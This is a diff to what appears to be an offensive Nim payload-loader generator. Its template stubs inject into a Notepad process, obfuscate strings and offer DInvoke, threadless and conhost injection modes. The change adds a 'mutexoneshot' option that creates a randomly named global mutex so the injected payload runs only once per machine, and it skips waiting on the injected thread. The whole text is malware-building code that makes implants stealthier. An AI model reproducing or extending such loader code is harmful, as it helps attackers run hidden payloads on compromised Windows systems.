@@ -3712,7 +3712,8 @@ let NotepadProcIDStub * = fmt"""
                 # resume main thread for execution
                 ResumeThread(treadHandle)
                 # Wait for the thread to finish
-                WaitForSingleObject(treadHandle, INFINITE)
+                when not defined(mutexoneshot):
+                    WaitForSingleObject(treadHandle, INFINITE)
                 when defined(verbose):
                     echo obf("[*] Quit main process...")
                 quit(1)
@@ -3828,6 +3829,22 @@ when not defined(DInvoke):
         from winim import GetModuleInformation,MODULEINFO,LPMODULEINFO
 
 proc main(lpParameter: LPVOID) : DWORD {.stdcall.} =
+
+    when defined(mutexoneshot):
+        Sleep(2000)
+        var dontcontinue: BOOL = FALSE
+        var temp: array[MAX_PATH, char]
+        if GetModuleFileNameA(cast[HMODULE](0), cast[LPSTR](temp.addr), DWORD(temp.len)) > 0:
+            let mutexName = &"Global\\REPLACEMUTEX"
+            var lastError: DWORD
+            let mutex = CreateMutexA(nil, TRUE, mutexName)
+            lastError = GetLastError()
+            if mutex != 0 and lastError != ERROR_ALREADY_EXISTS:
+                dontcontinue = FALSE
+            else:
+                dontcontinue = TRUE
+        if(dontcontinue):
+            quit(1)
 
 """
 
@@ -4110,7 +4127,12 @@ if(threadless):
 if(conhostinject):
     stub.add(conhostinjectenumstubs)
 
-stub.add(MainStub)
+if (not mutexoneshot):
+    stub.add(MainStub)
+else:
+    var mutexname = rndStr(8)
+    var newMainStub = MainStub.replace("REPLACEMUTEX", mutexname)
+    stub.add(newMainStub)
 
 stub.add(getRandStub())
 
